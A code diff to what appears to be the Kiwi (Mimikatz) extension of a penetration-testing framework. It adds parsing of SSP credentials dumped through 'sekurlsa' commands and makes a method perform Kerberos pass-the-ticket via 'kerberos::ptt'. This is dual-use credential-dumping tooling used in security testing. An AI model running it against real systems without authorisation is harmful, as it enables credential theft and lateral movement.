@@ -95,6 +95,10 @@ class Kiwi < Extension
     exec_cmd('lsadump::cache')
   end
 
+  def creds_ssp
+    { ssp: parse_ssp(exec_cmd('sekurlsa::ssp')) }
+  end
+
   def creds_msv
     { msv: parse_msv(exec_cmd('sekurlsa::msv')) }
   end
@@ -115,10 +119,43 @@ class Kiwi < Extension
     output = exec_cmd('sekurlsa::logonpasswords')
     {
       msv: parse_msv(output),
+      ssp: parse_ssp(output),
       wdigest: parse_wdigest(output),
       tspkg: parse_tspkg(output),
       kerberos: parse_kerberos(output)
     }
+  end
+
+  def parse_ssp(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an wdigest line
+      next if line !~ /\sssp\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      while line =~ /\[\d+\]/
+        line = lines.shift
+        # then the next 3 lines should be interesting
+        ssp = {}
+        3.times do
+          k, v = read_value(line)
+          ssp[k.strip] = v if k
+          line = lines.shift
+        end
+
+        if ssp.length > 0
+          results[ssp.values.join('|')] = ssp
+        end
+      end
+    end
+
+    results.values
   end
 
   def parse_wdigest(output)
@@ -273,9 +310,9 @@ class Kiwi < Extension
   #
   # @return [void]
   #
-  def kerberos_ticket_use(ticket)
-    base64_content = Rex::Text.encode(ticket)
-    true
+  def kerberos_ticket_use(base64_ticket)
+    result = exec_cmd("\"kerberos::ptt #{base64_ticket}\"")
+    result.strip.end_with?(': OK')
   end
 
   #
@@ -327,7 +364,7 @@ class Kiwi < Extension
 
     saving = false
     content = []
-    output.lines.each do |l|
+    output.lines.map(&:strip).each do |l|
       if l.start_with?('Base64 of file')
         saving = true
       elsif saving
@@ -339,7 +376,7 @@ class Kiwi < Extension
       end
     end
 
-    Rex::Text.decode_base64(content[1, content.length].join(''))
+    content.join('')
   end
 
   #
